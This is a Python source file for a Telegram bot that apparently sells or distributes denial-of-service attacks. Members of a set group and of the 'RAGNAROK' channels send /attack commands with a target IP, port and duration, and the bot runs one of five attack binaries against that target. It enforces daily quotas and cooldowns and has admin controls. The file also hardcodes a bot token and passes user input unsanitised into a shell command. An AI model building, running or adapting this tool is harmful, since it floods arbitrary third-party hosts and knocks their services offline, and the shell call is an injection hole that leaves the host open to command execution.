#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import threading

from keep_alive import keep_alive
keep_alive()

# Insert your Telegram bot token here
bot = telebot.TeleBot('8055632675:AAFP5nV0zAFvGtKy70oSAnG6pZQ0hDmBIZ4')

# Admin user IDs
admin_id = ["5599402910"]

# Group and channel details
GROUP_ID = "-1002155671416"
REQUIRED_CHANNELS = [
    "@RAGNAROKCRACKER",
    "@RAGNAROKCRACKS"
]

# Default attack limit
ATTACK_LIMIT = 10  # Max attacks per day
USER_FILE = "users.txt"

# Cooldowns and binaries for each attack
attack_cooldowns = {
    'attack1': {'cooldown': 500, 'last_used': None, 'binary': 'RAGNAROK'},
    'attack2': {'cooldown': 380, 'last_used': None, 'binary': 'RAGNAROK1'},
    'attack3': {'cooldown': 450, 'last_used': None, 'binary': 'RAGNAROK2'},
    'attack4': {'cooldown': 400, 'last_used': None, 'binary': 'RAGNAROK3'},
    'attack5': {'cooldown': 420, 'last_used': None, 'binary': 'RAGNAROK4'}
}

# Global variables
user_data = {}

# Function to load user data from the file
def load_users():
    try:
        with open(USER_FILE, "r") as file:
            for line in file:
                user_id, attacks, last_reset = line.strip().split(',')
                user_data[user_id] = {
                    'attacks': int(attacks),
                    'last_reset': datetime.datetime.fromisoformat(last_reset),
                }
    except FileNotFoundError:
        pass

# Function to save user data to the file
def save_users():
    with open(USER_FILE, "w") as file:
        for user_id, data in user_data.items():
            file.write(f"{user_id},{data['attacks']},{data['last_reset'].isoformat()}\n")

# Middleware to ensure users are in all required channels
def is_user_in_channel(user_id):
    try:
        for channel in REQUIRED_CHANNELS:
            member = bot.get_chat_member(channel, user_id)
            if member.status not in ['member', 'administrator', 'creator']:
                return False
        return True
    except Exception:
        return False

# Generalized attack handler for /attack1 to /attack5
@bot.message_handler(commands=['attack1', 'attack2', 'attack3', 'attack4', 'attack5'])
def handle_attack(message):
    command = message.text.split()[0][1:]  # Get the command name (e.g., 'attack1')
    command = command.split('@')[0]  # Strip the bot username if present
    user_id = str(message.from_user.id)

    # Ensure the command exists in cooldowns
    if command not in attack_cooldowns:
        bot.reply_to(message, "❌ Invalid command.")
        return

    attack_data = attack_cooldowns[command]
    binary = attack_data['binary']
    cooldown = attack_data['cooldown']

    # Ensure cooldown is respected
    now = datetime.datetime.now()
    if attack_data['last_used'] and (now - attack_data['last_used']).seconds < cooldown:
        remaining = cooldown - (now - attack_data['last_used']).seconds
        bot.reply_to(
            message, 
            f"⏳ **{command} is on cooldown:** `{remaining} seconds` remaining.\n\n"
            f"Click /attack_status to see all attacks' status."
        )
        return

    # Check usage requirements
    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, "❌ This bot can only be used in the specified group.")
        return
    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"❌ You must join all required channels to use this bot:\n" + "\n".join(REQUIRED_CHANNELS))
        return
    if user_id not in user_data:
        user_data[user_id] = {'attacks': 0, 'last_reset': datetime.datetime.now()}
    user = user_data[user_id]
    if user['attacks'] >= ATTACK_LIMIT:
        bot.reply_to(message, "❌ Daily limit reached. Try again tomorrow!")
        return

    # Parse command arguments
    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, "⚙️ **Usage:** `/attackX <IP> <PORT> <TIME>`")
        return
    target, port, time_duration = args[1], args[2], args[3]
    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ PORT and TIME must be integers.")
        return
    if time_duration > 240:
        bot.reply_to(message, "⚠️ Attack duration cannot exceed 240 seconds.")
        return

    # Execute the attack
    full_command = f"./{binary} {target} {port} {time_duration}"
    try:
        bot.reply_to(
            message,
            f"🚀 **Attack Initiated!**\n"
            f"📍 **Target:** `{target}`\n"
            f"🔢 **Port:** `{port}`\n"
            f"⏱ **Duration:** `{time_duration} seconds`\n"
            f"🧮 **Remaining Attacks:** `{ATTACK_LIMIT - user['attacks'] - 1}`"
        )

        # Start cooldown immediately here, before executing attack
        attack_data['last_used'] = now

        # Execute the attack
        subprocess.run(full_command, shell=True)
        bot.reply_to(message, "✅ **Attack Completed Successfully!**")
    except Exception as e:
        bot.reply_to(message, f"❌ Execution Error: {str(e)}")
        return

    # Update user data after attack
    user['attacks'] += 1
    save_users()

# Command to check remaining attacks
@bot.message_handler(commands=['remaining'])
def remaining_attacks(message):
    user_id = str(message.from_user.id)
    if user_id not in user_data:
        user_data[user_id] = {'attacks': 0, 'last_reset': datetime.datetime.now()}
    user = user_data[user_id]
    remaining = ATTACK_LIMIT - user['attacks']
    bot.reply_to(message, f"🧮 **Remaining Attacks for Today:** `{remaining}`")

# Admin command: View users and their remaining attacks
@bot.message_handler(commands=['viewusers'])
def view_users(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "❌ **Permission Denied:** Only admins can use this command.")
        return

    if not user_data:
        bot.reply_to(message, "ℹ️ No users found.")
        return

    response = "📋 **User Attack Data:**\n\n"
    for user_id, data in user_data.items():
        remaining_attacks = ATTACK_LIMIT - data['attacks']
        response += f"👤 **User ID:** `{user_id}`\n   🌟 **Remaining Attacks:** `{remaining_attacks}`\n\n"

    bot.reply_to(message, response)

# Admin command: Reset a user's attack limit
@bot.message_handler(commands=['reset'])
def reset_user(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "❌ **Permission Denied:** Only admins can use this command.")
        return

    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "⚙️ **Usage:** `/reset <USER_ID>`")
        return

    user_id = args[1]
    if user_id not in user_data:
        bot.reply_to(message, f"❌ User `{user_id}` not found.")
        return

    user_data[user_id]['attacks'] = 0
    save_users()
    bot.reply_to(message, f"✅ **Attack limit reset for User ID:** `{user_id}`")

# Command to check all cooldowns
@bot.message_handler(commands=['attack_status'])
def attack_status(message):
    status = "📊 **Attack Cooldown Status:**\n\n"
    now = datetime.datetime.now()
    for cmd, data in attack_cooldowns.items():
        if data['last_used'] and (now - data['last_used']).seconds < data['cooldown']:
            remaining = data['cooldown'] - (now - data['last_used']).seconds
            status += f"⏳ **/{cmd}:** Remaining `{remaining}/{data['cooldown']} seconds`\n"
        else:
            status += f"✅ **/{cmd}:** Ready to use.\n"
    bot.reply_to(message, status)
    
# Admin command: Set cooldown for a specific attack
@bot.message_handler(commands=['setcooldown'])
def set_cooldown(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "❌ **Permission Denied:** Only admins can use this command.")
        return

    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, "⚙️ **Usage:** `/setcooldown <attackX> <seconds>`")
        return

    command, seconds = args[1], args[2]
    if command not in attack_cooldowns:
        bot.reply_to(message, f"❌ Invalid attack name: `{command}`")
        return
    try:
        seconds = int(seconds)
    except ValueError:
        bot.reply_to(message, "❌ Cooldown must be an integer.")
        return

    attack_cooldowns[command]['cooldown'] = seconds
    bot.reply_to(message, f"✅ Cooldown for `{command}` set to `{seconds} seconds`.")

# Function to reset user limits daily
def auto_reset():
    while True:
        now = datetime.datetime.now()
        seconds_until_midnight = ((24 - now.hour - 1) * 3600) + ((60 - now.minute - 1) * 60) + (60 - now.second)
        time.sleep(seconds_until_midnight)
        for user_id in user_data:
            user_data[user_id]['attacks'] = 0
            user_data[user_id]['last_reset'] = datetime.datetime.now()
        save_users()

# Start auto-reset in a separate thread
reset_thread = threading.Thread(target=auto_reset, daemon=True)
reset_thread.start()
# Load user data on startup
load_users()

# Start the bot
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
        time.sleep(15)
    
